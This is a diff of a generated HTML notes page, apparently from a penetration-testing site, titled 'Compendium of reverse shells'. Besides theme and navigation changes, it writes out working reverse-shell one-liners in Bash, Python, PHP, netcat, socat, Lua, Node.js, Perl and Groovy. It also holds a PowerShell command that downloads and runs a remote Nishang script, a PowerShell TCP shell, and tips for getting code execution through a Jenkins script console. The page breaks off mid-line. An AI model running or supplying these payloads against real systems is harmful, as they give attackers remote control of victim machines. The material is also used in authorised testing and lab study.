@@ -25,7 +25,7 @@
         
           
           
-          <meta name="theme-color" content="#ff6e42">
+          <meta name="theme-color" content="#000000">
         
       
     
@@ -52,7 +52,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="green">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="orange">
       
   
     
@@ -153,9 +153,7 @@
 
 
 
-  
-
-<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
       
@@ -193,7 +191,9 @@
   
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
@@ -414,17 +414,76 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" data-md-state="indeterminate" type="checkbox" id="nav-3" checked>
       
       <label class="md-nav__link" for="nav-3">
+        File Transfer
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="File Transfer" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          File Transfer
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/filetransfer_setup/" class="md-nav__link">
+        Environment Setup
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/ft_windows/" class="md-nav__link">
+        Windows File Transfers
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" data-md-state="indeterminate" type="checkbox" id="nav-4" checked>
+      
+      <label class="md-nav__link" for="nav-4">
         WebApps
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="WebApps" data-md-level="1">
-        <label class="md-nav__title" for="nav-3">
+        <label class="md-nav__title" for="nav-4">
           <span class="md-nav__icon md-icon"></span>
           WebApps
         </label>
@@ -457,17 +516,19 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" data-md-state="indeterminate" type="checkbox" id="nav-4" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" data-md-state="indeterminate" type="checkbox" id="nav-5" checked>
       
-      <label class="md-nav__link" for="nav-4">
+      <label class="md-nav__link" for="nav-5">
         HTB
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="HTB" data-md-level="1">
-        <label class="md-nav__title" for="nav-4">
+        <label class="md-nav__title" for="nav-5">
           <span class="md-nav__icon md-icon"></span>
           HTB
         </label>
@@ -523,6 +584,153 @@
               </div>
             
             
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#linux-and-os-agnostic-reverse-shells" class="md-nav__link">
+    Linux and OS agnostic reverse shells
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux and OS agnostic reverse shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bash" class="md-nav__link">
+    Bash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    Python
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    PHP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#netcat" class="md-nav__link">
+    Netcat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#socat" class="md-nav__link">
+    Socat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lua" class="md-nav__link">
+    Lua
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#node-js" class="md-nav__link">
+    Node JS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perl" class="md-nav__link">
+    Perl
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy" class="md-nav__link">
+    Groovy
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-reverse-shells" class="md-nav__link">
+    Windows reverse shells
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows reverse shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nishang" class="md-nav__link">
+    Nishang
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conpty" class="md-nav__link">
+    ConPty
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general-tricks-and-upgrading-the-shell" class="md-nav__link">
+    General tricks and upgrading the shell
+  </a>
+  
+    <nav class="md-nav" aria-label="General tricks and upgrading the shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -533,59 +741,74 @@
 <p>Compendium of reverse shells.</p>
 <h2 id="linux-and-os-agnostic-reverse-shells">Linux and OS agnostic reverse shells</h2>
 <h3 id="bash">Bash</h3>
-<div class="highlight"><pre><span></span><code>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/8080 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> 
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/8080 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> 
 </code></pre></div>
+</td></tr></table>
 <div class="admonition info">
 <p class="admonition-title">Info</p>
 <p>Sometimes is not possible to put spaces in the payload. <code>${IFS}</code> can be used as a separator on linux systems.</p>
 </div>
 <h3 id="python">Python</h3>
-<p><div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="mi">1234</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">]);</span>
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="mi">1234</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">]);</span>
 </code></pre></div>
+</td></tr></table>
 This will be executed if you are injecting this code into a python execution context. In case we need to do it from a shell, you can prepend <code>python -c 'payload'</code></p>
 <div class="admonition warning">
 <p class="admonition-title">Warning</p>
 <p>It is possible that if you are executing this into a shell (eg. Bash) can assume that python is not installed if the execution fails. Try <code>python3</code> for example, it could be only installed under this name.</p>
 </div>
 <p>Alternative Method:
-<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="mi">4242</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
-</code></pre></div></p>
-<h3 id="php">PHP</h3>
-<p><div class="highlight"><pre><span></span><code><span class="x">$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="mi">4242</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
 </code></pre></div>
+</td></tr></table></p>
+<h3 id="php">PHP</h3>
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="x">$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span>
+</code></pre></div>
+</td></tr></table>
 Or prepending <code>php -r 'payload'</code> if we executing this from a shell context.</p>
 <h3 id="netcat">Netcat</h3>
-<div class="highlight"><pre><span></span><code>nc -e /bin/sh <span class="m">10</span>.0.0.1 <span class="m">1234</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>nc -e /bin/sh <span class="m">10</span>.0.0.1 <span class="m">1234</span>
 </code></pre></div>
+</td></tr></table>
 <div class="admonition info">
 <p class="admonition-title">Info</p>
 <p>This will only work on systems that have the "insecure" version of netcat installed. The <code>-e</code> functionality its usually disabled. Sometimes can be found in <code>nc.traditional</code> program if it is installed.</p>
 </div>
 <p>In case Netcat is installed but without the <code>-e</code> flag, you can do the following (FIFO pipes shell)
-<div class="highlight"><pre><span></span><code>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc <span class="m">10</span>.0.0.1 <span class="m">4242</span> &gt;/tmp/f
-</code></pre></div></p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc <span class="m">10</span>.0.0.1 <span class="m">4242</span> &gt;/tmp/f
+</code></pre></div>
+</td></tr></table></p>
 <h3 id="socat">Socat</h3>
 <p>Attacker:</p>
-<p><div class="highlight"><pre><span></span><code>socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> TCP-L:4242
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> TCP-L:4242
 </code></pre></div>
+</td></tr></table>
 Victim:</p>
-<div class="highlight"><pre><span></span><code>/tmp/socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>/tmp/socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 </code></pre></div>
+</td></tr></table>
 <h3 id="lua">Lua</h3>
-<div class="highlight"><pre><span></span><code><span class="kd">local</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span> <span class="mi">4242</span> <span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;socket&quot;</span><span class="p">)</span> <span class="kd">local</span> <span class="n">tcp</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">tcp</span><span class="p">()</span> <span class="kd">local</span> <span class="n">io</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;io&quot;</span><span class="p">)</span> <span class="n">tcp</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span> <span class="kr">while</span> <span class="kc">true</span> <span class="kr">do</span> <span class="kd">local</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">status</span><span class="p">,</span> <span class="n">partial</span> <span class="o">=</span> <span class="n">tcp</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span> <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;*a&quot;</span><span class="p">)</span> <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span> <span class="n">tcp</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="kr">if</span> <span class="n">status</span> <span class="o">==</span> <span class="s2">&quot;closed&quot;</span> <span class="kr">then</span> <span class="kr">break</span> <span class="kr">end</span> <span class="kr">end</span> <span class="n">tcp</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kd">local</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span> <span class="mi">4242</span> <span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;socket&quot;</span><span class="p">)</span> <span class="kd">local</span> <span class="n">tcp</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">tcp</span><span class="p">()</span> <span class="kd">local</span> <span class="n">io</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;io&quot;</span><span class="p">)</span> <span class="n">tcp</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span> <span class="kr">while</span> <span class="kc">true</span> <span class="kr">do</span> <span class="kd">local</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">status</span><span class="p">,</span> <span class="n">partial</span> <span class="o">=</span> <span class="n">tcp</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span> <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;*a&quot;</span><span class="p">)</span> <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span> <span class="n">tcp</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="kr">if</span> <span class="n">status</span> <span class="o">==</span> <span class="s2">&quot;closed&quot;</span> <span class="kr">then</span> <span class="kr">break</span> <span class="kr">end</span> <span class="kr">end</span> <span class="n">tcp</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div>
+</td></tr></table>
 <h3 id="node-js">Node JS</h3>
-<div class="highlight"><pre><span></span><code><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh 10.0.0.1 4242&#39;</span><span class="p">)</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh 10.0.0.1 4242&#39;</span><span class="p">)</span>
 </code></pre></div>
+</td></tr></table>
 <h3 id="perl">Perl</h3>
-<div class="highlight"><pre><span></span><code><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
 </code></pre></div>
+</td></tr></table>
 <h3 id="groovy">Groovy</h3>
-<div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="o">;</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="o">;</span>
 <span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">8044</span><span class="o">;</span>
 <span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s2">&quot;cmd.exe&quot;</span><span class="o">;</span>
 <span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span><span class="k">try</span> <span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
 </code></pre></div>
+</td></tr></table>
 <div class="admonition hint">
 <p class="admonition-title">Hint</p>
 <p>Useful when exploiting Jenkins. If your Jenkins privileges let you to access groovy console (Tipically found at <code>/script</code> on jenkins GUI) it is possible to use this reverse shell to get RCE.</p>
@@ -601,18 +824,21 @@ Victim:</p>
 <p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.</p>
 </div>
 <p>In memory execution:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="no">[IP]</span> <span class="n">-Port</span> <span class="no">[PortNo.]</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="no">[IP]</span> <span class="n">-Port</span> <span class="no">[PortNo.]</span>
 </code></pre></div>
+</td></tr></table>
 <p>You can also add in the file the last line <code>Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]</code> to the script and do the same function in one command.<br>
 Powershell One-Liner:
-<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.0.0.1&#39;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span 